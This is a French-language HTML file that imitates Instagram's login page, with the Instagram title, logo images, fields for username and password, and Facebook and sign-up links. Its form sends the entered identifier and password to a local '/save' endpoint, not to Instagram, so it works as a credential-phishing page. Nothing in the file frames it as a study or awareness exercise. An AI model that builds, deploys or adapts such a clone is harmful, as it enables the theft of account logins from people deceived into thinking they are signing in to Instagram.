<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Instagram</title>
  <link rel="icon" type="image/png" href="icone-insta.png">
  <style>
    
    :root{
      --bg:#000;
      --card-bg: transparent;
      --input-bg:#121212;
      --border:#555555;
      --placeholder:#a8a8a8;
      --text:#ffffff;
      --accent:#3844ac;
    }
    *{box-sizing:border-box;}
    html,body{height:100%;}
    body{
      margin:0;
      background:var(--bg);
      color:var(--text);
      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }
    .wrap{
      display:flex;
      gap:40px;
      align-items:flex-start;
      max-width:1100px;
      width:100%;
      justify-content:center;
    }
    .promo{
      width:520px;
      max-width:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:10px;
    }
    .image-side{
      width: 521.33px;
      height: 450px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #000;
    }
    .image-side img{
      width: 110%;
      height: 110%;
      object-fit: contain;
      background: #000;
    }
    .card{
      width:300px;
      background:var(--card-bg);
      padding:0;
    }
    .brand{
      font-size:40px;
      font-weight:600;
      text-align:center;
      margin:0 0 45px 0;
      letter-spacing:1px;
      color:var(--text);
      user-select:none;
    }
    .input-group{
      position: relative;
      width: 100%;
      margin-bottom: 10px;
    }
    .input{
      width:100%;
      padding:14px 12px 6px 12px;
      border-radius:13px;
      border:1px solid var(--border);
      background:var(--input-bg);
      color:var(--text);
      font-size:14px;
      outline:none;
    }
    .input:focus {border-color: #777;}
    .input-label{
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: var(--placeholder);
      pointer-events: none;
      transition: 0.2s ease all;
    }
    .input:focus + .input-label,
    .input:not(:placeholder-shown) + .input-label {
      top: 6px;
      font-size: 11px;
      color: var(--placeholder);
    }
    .toggle-password{
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 13px;
      color: #fff;
      cursor: pointer;
      user-select: none;
      display: none;
    }
    .btn{
      margin-top:8px;
      width:100%;
      padding:10px 12px;
      border-radius:25px;
      border:none;
      background:#0A3C6E;
      color:#b3b3b3;
      font-weight:700;
      font-size:14px;
      cursor:not-allowed;
      user-select:none;
      transition: background 0.2s, color 0.2s, cursor 0.2s;
    }
    .btn.active{
      background:#0D6EFD;
      cursor:pointer;
      color:#ffffff;
    }
    .btn:active.active{transform:translateY(1px);}
    .or{
      display:flex;
      align-items:center;
      gap:12px;
      margin:12px 0 6px 0;
      color:var(--placeholder);
      font-size:13px;
    }
    .or::before, .or::after{
      background-color:#262626;
      content:"";
      flex:1;
      height:1px;
    }
    .social{text-align:center;margin-top:6px;user-select:none;}
    .social a{
      color:#0095f6;
      text-decoration:none;
      font-weight:600;
      font-size:14px;
      display:inline-flex;
      align-items:center;
      gap:6px;
    }
    .fb-icon{
      width:32px;
      height:32px;
      display:inline-block;
      background-color:#000;
      padding:2px;
      border-radius:4px;
      user-select:none;
    }
    .muted{
      color:var(--placeholder);
      font-size:13px;
      text-align:center;
      margin-top:12px;
      user-select: none;
    }
    .top-logo{
      position: fixed;
      top: 50px;
      left: 60px;
      width: 75px; 
      height: auto;
      z-index: 1000;
    }
    .muted a{color:#fff;text-decoration:none;font-weight:600;}
    .muted a:hover{text-decoration:underline;}
    .secondary{
      color:#ffffff;
      width:345px;
      margin-top:14px;
      padding:16px;
      text-align:center;
      border:1px solid transparent;
    }
    .thirdary{
      width:310px;
      margin-top:14px;
      padding:12px;
      text-align:center;
      color:var(--placeholder);
      border:1px solid transparent;
      font-size:12px;
    }
    .signup{color:#708dff;text-decoration:none;font-weight:600;}
    .signup:hover{text-decoration:none;}
    .report-link{color:#708dff;font-weight:normal;text-decoration:none;}
    .report-link:hover{text-decoration:underline;}
    @media (max-width:920px){
      .wrap{flex-direction:column;align-items:center;gap:12px}
      .promo{display:none}
    }
    /* logo caché sur ordi */
    .brand-logo{
      display: none;
      width: 60px;
    }

    /* version mobile */
    @media (max-width: 600px){
    .brand-text{
      display: none;
    }

    .brand-logo{
      display: block;
      margin: 0 auto;
    }

    .brand{
      margin-bottom: 30px;
    }
  }
    @media (max-width:1100px){
    .top-logo{
      display: none;
    }
  }
  </style>
</head>
<body>
  <img src="icone-insta-sombre.png" alt="logo" class="top-logo">
  <main class="wrap" aria-labelledby="title">
    <aside class="promo" aria-hidden="true">
      <div class="image-side">
        <img src="photo-login-insta.png" alt="aperçu Instagram">
      </div>
    </aside>

    <section class="card" aria-labelledby="title">
      <h1 id="title" class="brand">
        <span class="brand-text">Instagram</span>
        <img src="icone-insta-sombre.png" alt="logo" class="brand-logo">
      </h1>
 
      <form id="loginForm" action="/save" method="POST">
        <div class="input-group">
          <input id="identifier" class="input" name="identifier" autocomplete="username" required placeholder=" ">
          <label class="input-label" for="identifier">Num. téléphone, nom de profil ou e-mail</label>
        </div>
 
        <div class="input-group">
          <input id="password" class="input" name="password" type="password" autocomplete="current-password" required placeholder=" ">
          <label class="input-label" for="password">Mot de passe</label>
          <span id="togglePw" class="toggle-password">Afficher</span>
        </div>
 
        <button id="submitBtn" class="btn" type="submit" disabled>Se connecter</button>
 
        <div class="or">OU</div>
 
        <div class="social">
          <a href="#" aria-label="Se connecter avec Facebook">
            <img src="facebook-13.png" alt="" class="fb-icon">
            Se connecter avec Facebook
          </a>
        </div>
 
        <div class="muted" style="margin-top:10px">
          <a href="#">Mot de passe oublié ?</a>
        </div>
      </form>
 
      <div class="thirdary">
        Vous pouvez également <a href="#" class="report-link">signaler le contenu que vous pensez illégal</a> dans votre pays sans vous connecter.
      </div>
 
      <div class="secondary">
        Vous n'avez pas de compte ? <a href="#" class="signup">Inscrivez-vous</a>
      </div>
  </main>
 
  <script>
    (function(){
      const identifier = document.getElementById('identifier');
      const password   = document.getElementById('password');
      const togglePw   = document.getElementById('togglePw');
      const btn        = document.getElementById('submitBtn');
 
      function checkForm() {
        const idOk = identifier.value.trim().length >= 1;
        const pwOk = password.value.length >= 6;
        if (idOk && pwOk) {
          btn.disabled = false;
          btn.classList.add('active');
        } else {
          btn.disabled = true;
          btn.classList.remove('active');
        }
      }
 
      identifier.addEventListener('input', checkForm);
      password.addEventListener('input', () => {
        togglePw.style.display = password.value.length > 0 ? 'block' : 'none';
        checkForm();
      });
 
      togglePw.addEventListener('click', () => {
        if (password.type === "password") {
          password.type = "text";
          togglePw.textContent = "Masquer";
        } else {
          password.type = "password";
          togglePw.textContent = "Afficher";
        }
      });
    })();
  </script>
</body>
</html>
